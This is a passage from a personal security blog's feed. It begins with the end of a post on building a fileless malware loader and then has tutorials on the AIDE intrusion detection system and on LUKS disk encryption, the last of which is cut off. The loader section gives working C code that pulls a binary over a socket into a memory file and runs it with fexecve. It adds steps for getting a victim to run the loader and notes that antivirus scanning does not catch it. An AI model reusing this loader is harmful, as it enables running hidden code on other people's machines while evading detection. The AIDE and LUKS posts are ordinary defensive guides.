</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s"> ----------------------------------- </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">read_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">write_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span><span class="p">(</span> <span class="p">(</span><span class="n">read_count</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span> <span class="n">sock</span> <span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="n">BUFF_SIZE</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  	<span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="n">write_count</span> <span class="o">=</span> <span class="nf">write</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="n">read_count</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  		<span class="nf">die</span><span class="p">(</span><span class="s">&#34;Failed to write to mem file&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  	<span class="n">i</span> <span class="o">+=</span> <span class="n">read_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  	<span class="n">j</span> <span class="o">+=</span> <span class="n">write_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\r</span><span class="s">Read count = %6d  |  Write count = %3d&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s"> ----------------------------------- </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ + ] Starting execution...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Change argv params
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// printf(&#34;BEFORE:  %s %s %s %s\n&#34;, argv[0], argv[1], argv[2], argv[3]);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">argc</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  	<span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>  <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// printf(&#34;AFTER:   %s %s %s %s\n&#34;, argv[0], argv[1], argv[2], argv[3]);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Execute fd1 - with new argv
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">fexecve</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// If fexecve returns, then it is failed.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed Executing....</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">errno</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Compile it &ndash;&gt; <code>gcc network_loader.c -o network_loader.o</code></p>
<p>With this, we have everything ready with us. Some more steps and we are done.</p>
<ol>
<li>Start the python server on attacker&rsquo;s machine. - <code>python3 python_server.py</code></li>
<li>Place the <code>network_loader.o</code> on victim&rsquo;s machine.</li>
<li>Politely ask the victim to execute the binary - <code>./network_loader.o 192.168.56.56 1234</code></li>
<li>Sit back and enjoy!</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## On Attacker&#39;s machine</span>
</span></span><span class="line"><span class="cl"><span class="o">$</span> <span class="n">python3</span> <span class="n">python_server</span><span class="o">.</span><span class="n">py</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mi">16800</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span> <span class="n">fd</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">family</span><span class="o">=</span><span class="n">AddressFamily</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">type</span><span class="o">=</span><span class="n">SocketKind</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">proto</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">laddr</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;192.168.56.56&#39;</span><span class="p">,</span> <span class="mi">1234</span><span class="p">),</span> <span class="n">raddr</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;192.168.56.56&#39;</span><span class="p">,</span> <span class="mi">50812</span><span class="p">)</span><span class="o">&gt;</span> <span class="p">(</span><span class="s1">&#39;192.168.56.56&#39;</span><span class="p">,</span> <span class="mi">50812</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## on victim&#39;s machine</span>
</span></span><span class="line"><span class="cl"><span class="o">$</span> <span class="o">./</span><span class="n">network_loader</span><span class="o">.</span><span class="n">o</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.56</span> <span class="mi">1234</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="o">*</span> <span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">create</span> <span class="n">a</span> <span class="n">mem</span> <span class="n">file</span><span class="o">...</span>  
</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="o">+</span> <span class="p">]</span> <span class="n">Created</span> <span class="n">mem</span> <span class="n">file</span> <span class="ow">and</span> <span class="n">attached</span> <span class="n">to</span> <span class="n">fd</span> <span class="o">=</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="o">-----------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="n">Read</span> <span class="n">count</span> <span class="o">=</span>  <span class="mi">16800</span>  <span class="o">|</span>  <span class="n">Write</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">16800</span>
</span></span><span class="line"><span class="cl"><span class="o">-----------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="o">+</span> <span class="p">]</span> <span class="n">Starting</span> <span class="n">execution</span><span class="o">...</span>
</span></span></code></pre></div><p>And if we check the victim&rsquo;s working directory we can see a file with name <code>NOTICE_for_U.txt</code> there&hellip;. which confirms that the remote binary successfully ran on victim&rsquo;s machine.</p>
<p><img loading="lazy" src="https://media.giphy.com/media/LpLd2NGvpaiys/giphy.gif" alt=""  />
</p>
<hr>
<p>Voila! We just executed a remotely located binary without leaving anytrace on harddisk for further analysis. What we have is a loader binary that reads unknown data from somewhere and just executes it. And there is nothing in the loader binary that could be detected as malicious by most of the automated analysis tools&hellip; even VirusTotal does not detect it for what it is.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/716/1*TSWENZxQ7unvU9Qwc3x3xQ.png" alt=""  />
</p>
<p><em><a href="https://nvd.nist.gov/vuln/detail/cve-2021-4034">CVE-2021-4038</a> describes as a local privilege escalation vulnerability that was found on polkit&rsquo;s pkexec utility. I&rsquo;m not sure if it is a false positive or based on similar signatures.</em></p>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://lwn.net/Articles/631631/">How programs get run: ELF binaries</a> (lwn.net)</li>
<li><a href="https://tldp.org/LDP/tlk/mm/memory.html">Chapter 3 - Memory Management</a> (tldp.org)</li>
<li><a href="https://en.wikipedia.org/wiki/Fileless_malware">Fileless Malwares</a> (wikipedia.org)</li>
<li><a href="https://us.norton.com/internetsecurity-malware-what-is-fileless-malware..html">what is fileless malware</a> (norton.com)</li>
<li><a href="https://news.sophos.com/en-us/2021/03/04/covert-code-faces-a-heap-of-trouble-in-memory/">covert code faces a heap of trouble in memory</a> (sophos.com)</li>
<li><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/fileless-threats">Intelligence: File less threats</a> (microsoft.com)</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Advanced Intrusion Detection Environment</title>
      <link>https://ayedaemon.github.io/post/2020/12/advanced-intrusion-detection-environment/</link>
      <pubDate>Sat, 19 Dec 2020 14:25:28 +0530</pubDate>
      
      <guid>https://ayedaemon.github.io/post/2020/12/advanced-intrusion-detection-environment/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;Host-based intrusion detection system (HIDS) for checking the integrity of files.&lt;/p&gt;
&lt;/blockquote&gt;</description>
      <content:encoded><![CDATA[<blockquote>
<p>Host-based intrusion detection system (HIDS) for checking the integrity of files.</p>
</blockquote>
<p>Advanced Intrusion Detection Environment (AIDE) is a <strong>host-based intrusion detection system (HIDS)</strong> for checking the integrity of files. It does this by creating a <strong>baseline database</strong> of files on an initial run, and then checks this database against the system on subsequent runs. File properties that can be checked against include inode, permissions, modification time, file contents, etc……….. <a href="https://wiki.archlinux.org/index.php/AIDE"><em>more at archwiki</em>📚</a></p>
<p>According to the definition, AIDE only checks for the <strong>integrity of file</strong> but <strong>not for rootkits</strong> and logs for other suspicious activities.</p>
<p><em>But there are other HIDS tools that can do this for you. Like,</em> <a href="https://www.splunk.com/"><em>Splunk</em></a> <em>and</em> <a href="https://www.ossec.net/"><em>OSSEC</em></a><em>.</em></p>
<p>AIDE have provided a <a href="https://aide.github.io/doc/">pretty simple documentation</a> to undertand and get familiar with it.</p>
<h3 id="how-to-install-it">How to install it?</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># Check what repo will provide you aide tool.  </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">yum</span> <span class="n">whatprovides</span> <span class="n">aide</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># And then install it, if available.  </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">yum</span> <span class="n">install</span> <span class="n">aide</span> <span class="o">-</span><span class="n">y</span>
</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*GH5ZoirRAKBXJOdkSk4K2A.png" alt="aide-whatprovides-install"  />
</p>
<h3 id="next-step-">Next step ..??</h3>
<p>Let’s check the files unpacked from the <strong>aide package</strong> we just installed.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*WBBWo0dITSPIgjfNqPTrZA.png" alt="aide-rpm-ql"  />
</p>
<p>We found a configuration file — <code>/etc/aide.conf</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># open the file with vim or your favourite text editor  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">vim /etc/aide.conf  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># The file looked very huge so I checked its length.  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">wc /etc/aide.conf  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># OUTPUT:  
</span></span><span class="line"><span class="cl"># 312 765 7333 /etc/aide.conf
</span></span></code></pre></div><p>Fortunately they have given a man page for the configurations settings.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">man 5 aide.conf
</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*0HZv3rMcdAFMTbYiyPn_Xw.png" alt="aide.conf"  />
</p>
<p>This gives me a good news. There are only 3 types of line in the configuration file.</p>
<ul>
<li>There are the 1️⃣<em>configuration lines</em> which are used to <strong>set configuration parameters</strong> and <strong>define/undefine variables</strong>.</li>
<li>There are 2️⃣<em>selection lines</em> that are used to indicate <strong>which files are added</strong> to the database.</li>
<li>3️⃣ <em>macro lines</em> <strong>define or undefine variables</strong> within the config file.</li>
<li>Lines beginning with # are ignored as <strong>comments</strong>.#️⃣</li>
</ul>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*LRp9V0giXu-oxaae.gif" alt="Really"  />
</p>
<p>You can now check the config file and things will make more sense to you. Also you can check the key-value pairs from <a href="https://linux.die.net/man/5/aide.conf">man page</a>.</p>
<h3 id="enough-for-configuration-how-to-use-it">Enough for configuration… How to use it?</h3>
<p>Go to the <a href="https://linux.die.net/man/1/aide">man page</a> of aide.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># from terminal  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">man aide
</span></span></code></pre></div><p>Again a reminder, and I quote.</p>
<blockquote>
<p>AIDE is an <strong>intrusion detection system</strong> for checking the <strong>integrity of files</strong>.</p>
</blockquote>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*gNw75QXgQiRPoxgopKvZSQ.png" alt="man-aide"  />
</p>
<p>One thing to notice here is <em><strong>DIAGNOSTICS</strong></em> (<em>Scroll down to bottom on the man page</em>).</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*m3ygM3U9O_-eooMR-3NJcA.png" alt="diagnostics"  />
</p>
<p>Another is, that AIDE can be controlled using few basic commands.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*nYCpUl-Pv4oHGnjbTsYXew.png" alt="commands"  />
</p>
<h3 id="time-for-some-fun-now">Time for some fun now!!</h3>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*eV9LiAtIIoAbbflD.gif" alt="lets-play"  />
</p>
<p><strong>Game-play</strong></p>
<ul>
<li>Create a folder and some files in it.</li>
<li>Configure AIDE to add that folder in database.</li>
<li>Have fun with the folder and files and check the AIDE logs for reports.</li>
</ul>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*4RBSuCrL2W9C1Y9MspWl2w.png" alt="create-folder"  />
</p>
<p>Adding my new folder and files to aide.conf</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#-------------- My-Settings ---------------  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">myfilter = sha256  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/fun-with-aide myfilter
</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*aC940c2LfvDHrQu_D4nKoA.png" alt="add-to-conf"  />
</p>
<p>This rule is a regular expression rule and will match the complete path of any file starting from /fun-with-aide, so this will include the files inside this folder.</p>
<p>Now some simple steps to follow:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">*</span> <span class="n">aide</span> <span class="o">--</span><span class="n">init</span>
</span></span><span class="line"><span class="cl"><span class="o">*</span> <span class="n">cp</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">aide</span><span class="o">/</span><span class="n">aide</span><span class="o">.</span><span class="n">db</span><span class="o">.</span><span class="n">new</span><span class="o">.</span><span class="n">gz</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">aide</span><span class="o">/</span><span class="n">aide</span><span class="o">.</span><span class="n">db</span><span class="o">.</span><span class="n">gz</span>
</span></span><span class="line"><span class="cl"><span class="o">*</span> <span class="n">aide</span> <span class="o">--</span><span class="n">check</span>
</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*G7iCTRi0C6ttmWQe3-oxyA.png" alt="aide-check"  />
</p>
<p>What if we tinker with the file /fun-with-aide/file1?</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*wDbGmR7vps5vsqs3i8_Icg.png" alt="tinker-file1"  />
</p>
<p>I have changed the content of the file1, due to which the sha256sum has also changed. This should be reported by <strong>aide</strong> in reports.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*z0Zq2wGpayGYo079V8bgUw.png" alt="aide-check"  />
</p>
<p>This generates a report that tells about the changes. I’ll get a count of <em>added files</em>, <em>removed files</em> and <em>changed files</em>, along with the name of those files and some detailed information.</p>
<hr>
<p>AIDE can be run manually if desired, but automation is the way nowadays.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*ip12LNV58018AQ8G.gif" alt="yeah-automation"  />
</p>
<p>Check the below provided simple cron job script to automatically check for the changes. For more complex examples check <a href="https://sources.gentoo.org/cgi-bin/viewvc.cgi/gentoo-x86/app-forensics/aide/files/aide.cron">this</a> and <a href="https://rfxn.com/downloads/cron.aide">this</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># SOURCE: https://wiki.archlinux.org/index.php/AIDE  </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash -e  </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># these should be the same as what&#39;s defined in /etc/aide.conf  </span>
</span></span><span class="line"><span class="cl"><span class="nv">database</span><span class="o">=</span>/var/lib/aide/aide.db.gz  
</span></span><span class="line"><span class="cl">database<span class="se">\_</span>out<span class="o">=</span>/var/lib/aide/aide.db.new.gz  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> ! -f <span class="s2">&#34;</span><span class="nv">$database</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>  
</span></span><span class="line"><span class="cl"> <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$database</span><span class="s2"> not found&#34;</span> &gt;<span class="p">&amp;</span><span class="m">2</span>  
</span></span><span class="line"><span class="cl"> <span class="nb">exit</span> <span class="m">1</span>  
</span></span><span class="line"><span class="cl"><span class="k">fi</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">aide -u <span class="o">||</span> <span class="nb">true</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mv <span class="nv">$database</span> <span class="nv">$database</span>.back  
</span></span><span class="line"><span class="cl">mv <span class="nv">$database</span><span class="se">\_</span>out <span class="nv">$database</span>
</span></span></code></pre></div><hr>
<p><strong>What about if attacker changed the database??</strong></p>
<p>When I checked the file type of the <em>aide.db.gz</em>&hellip; It came out to be a gzip compressed data, from Unix, max compression file.</p>
<p>This makes it very obvious to unzip this compressed file. I prefer using gunzip tool.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*rP1BY4TIP5OLCxQj4_GrGw.png" alt="operation-theatre"  />
</p>
<p>Specification of the db is also mentioned in the file.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*FB264rJGlMj1Tr-4tPSWHg.png" alt="db_spec"  />
</p>
<p>Visualizing the above in a tabular manner.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*3MXSU4ub4fgXolHfPB34Qw.png" alt=""  />
</p>
<p><strong>You can add more filters and integrity checks to test other things as well.</strong></p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*v87DoqZLe0Cq2K-f.gif" alt="being-tonystark"  />
</p>
<p>This whole db thing gives rise to a question. <strong>What if the attacker modifies the db??</strong></p>
<p>Hmmm.. then he wins🤷‍♂️. You have to keep your db secure from attackers. For this, you should keep your database in <strong>read-only mode</strong>. So that it can be only read and no modifications can be done to this. Also you can keep the DB in a different location like in a <strong>centralized server</strong> or in a <strong>removable media like pendrive</strong>. Or you can have it your way.</p>
<p>You can read more about <a href="https://wiki.gentoo.org/wiki/Integrity/Concepts">Integrity Concepts</a> here for better security guidelines.</p>
<h3 id="conclusion">Conclusion</h3>
<p>In the end, let’s understand how AIDE does what it does.</p>
<p>AIDE takes a “snapshot” of the state of the system, register hashes, modification times, and other data regarding the files defined by the administrator. This “snapshot” is used to build a database that is saved and may be stored on an external device for safekeeping.</p>
<p>When the administrator wants to run an integrity test, the administrator places the previously built database in an accessible place and commands AIDE to compare the database against the real status of the system. Should a change have happened to the computer between the snapshot creation and the test, AIDE will detect it and report it to the administrator. Alternatively, AIDE can be configured to run on a schedule and report changes daily using scheduling technologies such as cron.🔚</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*S_aFpI3KDiWfts2v.gif" alt="end"  />
</p>]]></content:encoded>
    </item>
    
    <item>
      <title>LUKS Disk Encryption</title>
      <link>https://ayedaemon.github.io/post/2020/12/luks-disk-encryption/</link>
      <pubDate>Sat, 19 Dec 2020 13:15:55 +0530</pubDate>
      
      <guid>https://ayedaemon.github.io/post/2020/12/luks-disk-encryption/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;Linux Unified Key Encryption — Disk Encryption&lt;/p&gt;
&lt;/blockquote&gt;</description>
      <content:encoded><![CDATA[<blockquote>
<p>Linux Unified Key Encryption — Disk Encryption</p>
</blockquote>
<p><strong>cryptsetup</strong> — <em>manage plain dm-crypt and LUKS encrypted volumes</em></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cryptsetup &lt;OPTIONS&gt; &lt;action&gt; &lt;action-specific-options&gt; &lt;device&gt; &lt;dmname&gt;
</span></span></code></pre></div><p>An encrypted blockdevice is protected by a key. A key is either:</p>
<ul>
<li>a passphrase, or</li>
<li>a keyfile</li>
</ul>
<h3 id="what-the">What the..?</h3>
<p>Ok.. If you are new to encryption world, then it’s time to get a bit familiar data encryption.</p>
<p>There are 2 methods to encrypt your data:</p>
<ul>
<li><strong>Filesystem stacked level encryption</strong> : Form of disk encryption where individual files or directories are encrypted by the file system itself. <a href="https://en.wikipedia.org/wiki/Filesystem-level_encryption">read more here</a></li>
<li><strong>Block device level encryption</strong> : The entire partition or disk, in which the file system resides, is encrypted.</li>
</ul>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*bg4VTXG8Lp6jq9aC.gif" alt=""  />
</p>
<p>Before things go really technical and scary, let me show you how your data is stored in a harddisk.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*2cy1Ut_NVLQof_vTZWoLAQ.png" alt=""  />
</p>
<p>Above diagram shows how your data is stored in a harddisk.</p>
<ul>
<li>You create files (I am calling it data chunks) and insert your data in it.</li>
<li>These files are stored in a very systematic and managed system called <strong>File System</strong>.</li>
<li>Partitions are formatted to carry a file system on it.</li>
<li>Harddisks are divided into Partitions. (<a href="https://askleo.com/should_i_partition_my_hard_disk/">Wanna know why? — ask Leo!</a>)</li>
</ul>
<p>Now when you know how your data is exactly stored in a harddisk. Let’s see how a <strong>Block device level encryption</strong> works.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*2easqwhcymbcCSp6fHSZ6g.png" alt=""  />
</p>
<p>Here, a new layer is added in the usual thing.</p>
<ul>
<li>We attach a harddisk to our system.</li>
<li>Create partitions on it.</li>
<li>Encrypt the complete partition (make it password protected) 🔐</li>
<li>Create filesystem (NTFS, EXT4, XFS, etc) on the encrypted partition.</li>
<li>Write/save your data chunks.</li>
</ul>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*rcPPu_6o2rOgW2bS.gif" alt=""  />
</p>
<hr>
<h3 id="just-do-it-now-">Just Do It now ✔️</h3>
<h3 id="installing-required-tools">Installing required tools</h3>
<p>I am using a RHEL based OS which uses yum/dnf package managers.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">yum install cryptsetup -y
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">or
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">dnf install -y cryptsetup
</span></span></code></pre></div><h3 id="creating-the-partition">Creating the partition</h3>
<p><code>lsblk</code> - check the device name for the harddisk (sdb)</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*4c6x1UUNyksMWLCc-Yqyaw.png" alt=""  />
</p>
<p><code>fdisk</code> - partitioning tool</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*k_dPP7Hb4tGu7ARPeVLvOg.png" alt=""  />

<img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*LEOYgsQ-9juROPCikHX42g.png" alt=""  />
</p>
<h3 id="formating-with-luks">formating with luks</h3>
<p><code>cryptsetup -y -v luksFormat /dev/sdb1</code> - encrypt the partition</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*SETeIxieb0fOBPCuX7aHNg.png" alt=""  />
</p>
<p><code>lsblk -f</code> - check the encrypted partition</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*pBN1T2AcoQyo5B8FucJV2g.png" alt=""  />
</p>
<p><code>cryptsetup -v luksOpen /dev/sdb1 myencrypt</code> - map the encrypted partition to &lsquo;myencrypt&rsquo;.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*zcUCmHHyDkU9YpBL5Zg5ZQ.png" alt=""  />
</p>
<p><code>lsblk -f</code> - check it</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*5SKWOXd-lSX468LhgJNiZQ.png" alt=""  />
</p>
<h3 id="creating-a-file-system">creating a file system</h3>
<p><code>mkfs.xfs /dev/mapper/myencrypt</code> - create a file system on top of the encrypted partition.</p>
<p><code>lsblk -f</code> - Check the layering and filesystem associated.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*ch_byQVfsZexQP7O7O7dag.png" alt=""  />
</p>
<h3 id="creating-a-mountpoint">creating a mountpoint</h3>
<p><code>mkdir -p /mnt/my_encrypted_backup mount -v /dev/mapper/myencrypt /mnt/my_encrypted_backup/</code></p>
<p><em>If you face such issues - SELinux lables blah blah blah</em></p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*GtzHhCp6CPR8YWBTOz-yqQ.png" alt=""  />
</p>
<p><em>Type this on magic terminal —</em> <em>restorecon -vvRF /mnt/my_encrypted_backup/</em> <em>- This will restore the SELinux context back to defaults for the destination directory.</em></p>
<h3 id="checking-luks-dumps">Checking luks dumps</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cryptsetup luksDump /dev/sdb1
</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*tWyJ8XLcwJuyRG-aUl8BZA.png" alt=""  />
</p>
<h3 id="adding-new-key">Adding new key</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mkdir /etc/luks-keys/; dd if=/dev/random of=/etc/luks-keys/mybackup\_key bs=32 count=1
</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*fE51gnVtgYGkSOeASgrzfQ.png" alt=""  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cryptsetup luksAddKey /dev/sdb1 /etc/luks-keys/mybackup\_key
</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*FBkoDsoqSHZ9AWw73ICg2Q.png" alt=""  />
</p>
<p>Checking the dumps again</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*7pWmoHcrHZmLXtGISkrCZQ.png" alt=""  />
</p>
<p>Now here are 2 slots available.</p>
<ul>
<li>one with the initial key I entered at the time of setting it up.</li>
<li>another, just in the above step.</li>
</ul>
<h4 id="at-this-particular-moment-there-are-few-questions-in-my-mind">At this particular moment, there are few questions in my mind.</h4>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*-Pngs8QCzMnlwKVv.gif" alt=""  />
</p>
<p>You should know them too.</p>
<ol>
